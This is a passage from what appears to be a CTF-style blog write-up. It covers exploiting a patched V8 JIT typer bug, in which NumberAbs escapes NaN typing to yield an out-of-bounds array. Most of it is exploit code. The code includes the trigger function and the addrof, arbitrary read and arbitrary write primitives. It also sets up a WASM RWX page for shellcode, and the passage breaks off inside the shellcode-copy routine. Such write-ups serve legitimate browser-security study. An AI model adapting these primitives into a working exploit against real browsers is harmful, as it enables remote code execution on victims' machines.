</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">arr</span> <span style="color:#f92672">=</span> Array(<span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">oob_arr</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1.1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">arr</span>;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
Based on previous patches applied to <code>CVE-2020-6383</code>, we can notice that after finalizing the for-loop, <code>i</code> has the type of <code>Union(NaN, kInteger)</code>. Since <code>i</code> contains the type <code>NaN</code>, arithmetic operations do not apply.</p>
<p>We can also observe that the type of <code>i</code> gets converted from a <code>Float64</code> representation to an <code>Int32</code> right before the Shift Arithmetic Right operation in the <code>Simplified Lowering</code> phase, in which coverts the value of <code>NaN</code> to 0:</p>
<p><img src="/2021-12-30-135147_969x753_scrot.png#center" alt=""></p>
<p>Moving forward from this point, the type inference of <code>i</code> align with the possible values that <code>i</code> may hold, and the creation of an Array with OOB indexed property access is not achieved.</p>
<p>However, we may be able to escape <code>NaN</code> typing abusing the <code>NumberAbs</code> function. As we covered previously, the patch for this challenge removes the <code>NaN</code> type check to the return value of <code>NumberAbs</code>, therefore it will effectively escape <code>NaN</code> typing of whatever value we provide as a parameter.</p>
<p>Lets modify our PoC and apply the following:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">trigger</span>() {
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Infinity</span>;
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">x</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Infinity</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#f92672">+</span><span style="color:#66d9ef">Infinity</span>;
</span></span><span style="display:flex;"><span>	  }
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">max</span>(<span style="color:#a6e22e">i</span>, <span style="color:#ae81ff">1024</span>);
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span>;                
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">max</span>(<span style="color:#a6e22e">i</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1025</span>); 
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span>;  
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">abs</span>(<span style="color:#a6e22e">i</span>);  <span style="color:#75715e">// &lt;------ escaping NaN typing
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1022</span>;              
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">1</span>;                
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;               
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">arr</span> <span style="color:#f92672">=</span> Array(<span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">oob_arr</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1.1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">arr</span>;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>If we analyze the Typer phase of this new instance of <code>trigger</code> in Turbolizer we will see the following:</p>
<p><img src="/2021-12-30-135741_872x715_scrot.png#center" alt=""></p>
<p>As we can observe, the call to <code>NumberAbs</code> escapes <code>NaN</code> typing. We can also observe based on Turbolizer&rsquo;s <code>Simplified Lowering</code> phase that the value of <code>i</code> changes from <code>NaN</code> to 0 via the <code>ChangeFloat64ToInt32</code> machine level node after the call to <code>NumberAbs</code>, enabling to apply arithmetic operations to the value of <code>i</code> moving forward:</p>
<p>![](/2021-12-30-140249_924x731_scrot 1.png#center)</p>
<p>Overall the wrong type inference in this scenario works as follows:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">trigger</span>() {
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Infinity</span>;
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">x</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Infinity</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#f92672">+</span><span style="color:#66d9ef">Infinity</span>;
</span></span><span style="display:flex;"><span>	  }
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e">// inference: i = (NaN | Range(-Inf, Inf)) -- reality: i = NaN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">max</span>(<span style="color:#a6e22e">i</span>, <span style="color:#ae81ff">1024</span>);
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e">// inference: i = (NaN | Range(1024, Inf)) -- reality: i = NaN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span>;                
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e">// inference: i = (NaN Range(-Inf, -1024)) -- reality: i = NaN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">max</span>(<span style="color:#a6e22e">i</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1025</span>); 
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e">// inference: i = (NaN | Range(-1025, -1024)) -- reality: i = NaN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span>;  
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e">// inference: i = (NaN | Range(1024, 1025)) -- reality: i = NaN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">abs</span>(<span style="color:#a6e22e">i</span>);  
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e">// i = ChangeFloat64ToInt32(NaN) = 0 (SimplifiedLowering)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#75715e">// inference: i = Range(1024, 1025) - reality: i = 0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1022</span>;              
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e">// inference: i = Range(2, 3) -- reality: i = -1022 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">1</span>;                
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e">// inference: i = Range(1, 1) -- reality: i = 1073741313 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;               
</span></span><span style="display:flex;"><span>	  <span style="color:#75715e">// inference: i = Range(2, 2) -- reality: i = 1073741314              
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">arr</span> <span style="color:#f92672">=</span> Array(<span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">oob_arr</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1.1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">arr</span>;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
After succesfully escaping <code>NaN</code> typing abusing <code>NumberAbs</code>, the vulnerability can be triggered enabling us to create an Array with OOB indexed property access.</p>
<h3 id="exploitation-1">Exploitation</h3>
<p>Now that we have OOB access, the exploit strategy is simple. We need an <code>addrof</code> primitive to obtain the address of arbitrary objects, and in this case, we can neglect the creation of a <code>fakeobj</code> primitive in order to create objects at arbitrary memory locations.
This is due to the fact that since we have a large enough OOB read/write primitive, it can be trivially converted into an arbitrary read/write primitive. In order to achieve successful exploitation we follow the following steps:</p>
<ol>
<li>First we allocate two arrays, an unboxed and a boxed array. These arrays should be declared after the OOB array so that they are consecutively allocated in V8&rsquo;s heap with respect to our OOB array, in order to access their contents through our OOB array.</li>
<li>We leak the map tagged pointers of both the boxed and unboxed array accordingly.</li>
<li>Leveraging the leaked maps, we construct an <code>addrof</code> primitive enabling type confusion of the unboxed array elements by changing the unboxed array map accordingly.</li>
<li>Construct arbitrary read/write primitives by overwriting the unboxed array&rsquo;s elements pointer (taking care of V8&rsquo;s pointer compression).</li>
<li>Instantiate a WASM instance, leak its RWX page and write the contents of arbitrary code to it to then pivot control flow of execution.</li>
</ol>
<h3 id="full-exploit">Full Exploit</h3>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>); 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f64_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">u64_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint32Array</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">val</span>) { 
</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">f64_buf</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">val</span>;
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">u64_buf</span>[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> (<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">u64_buf</span>[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>); 
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">val</span>) { 
</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">u64_buf</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> Number(<span style="color:#a6e22e">val</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">u64_buf</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> Number(<span style="color:#a6e22e">val</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">f64_buf</span>[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">trigger</span>() {
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Infinity</span>;
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">x</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Infinity</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#f92672">+</span><span style="color:#66d9ef">Infinity</span>;
</span></span><span style="display:flex;"><span>	  }
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">max</span>(<span style="color:#a6e22e">i</span>, <span style="color:#ae81ff">1024</span>);
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span>;                
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">max</span>(<span style="color:#a6e22e">i</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1025</span>); 
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">i</span>;  
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">abs</span>(<span style="color:#a6e22e">i</span>);  
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1022</span>;              
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">1</span>;                
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;               
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">arr</span> <span style="color:#f92672">=</span> Array(<span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">oob_arr</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1.1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">arr</span>;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x10000</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">trigger</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">oob_arr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">trigger</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flt_arr</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.2</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obj_arr</span> <span style="color:#f92672">=</span> [{}, {}];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flt_map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">oob_arr</span>[<span style="color:#ae81ff">5</span>]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span><span style="color:#a6e22e">n</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obj_map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">oob_arr</span>[<span style="color:#ae81ff">13</span>]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span><span style="color:#a6e22e">n</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">obj</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">oob_arr</span>[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">obj_map</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flt_arr</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">oob_arr</span>[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">flt_map</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">flt_arr</span>[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span><span style="color:#a6e22e">n</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">addr</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">old_elements</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">oob_arr</span>[<span style="color:#ae81ff">6</span>]
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">oob_arr</span>[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>((<span style="color:#ae81ff">2</span><span style="color:#a6e22e">n</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">leak</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">flt_arr</span>[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">oob_arr</span>[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">old_elements</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">leak</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">arb_write</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">val</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">old_elements</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">oob_arr</span>[<span style="color:#ae81ff">6</span>]
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">oob_arr</span>[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>((<span style="color:#ae81ff">2</span><span style="color:#a6e22e">n</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flt_arr</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">val</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">oob_arr</span>[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">old_elements</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_code</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>([
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">115</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">133</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">96</span>,<span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">127</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">130</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">112</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">131</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">129</span>,<span style="color:#ae81ff">128</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">145</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">109</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">111</span>,<span style="color:#ae81ff">114</span>,<span style="color:#ae81ff">121</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">138</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">65</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">11</span>
</span></span><span style="display:flex;"><span>	]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_mod</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Module</span>(<span style="color:#a6e22e">wasm_code</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_instance</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Instance</span>(<span style="color:#a6e22e">wasm_mod</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">wasm_instance</span>.<span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">main</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_instance_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">wasm_instance</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x68</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">rwx_page_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">wasm_instance_addr</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">copy_shellcode</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">shellcode</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">0x100</span>);
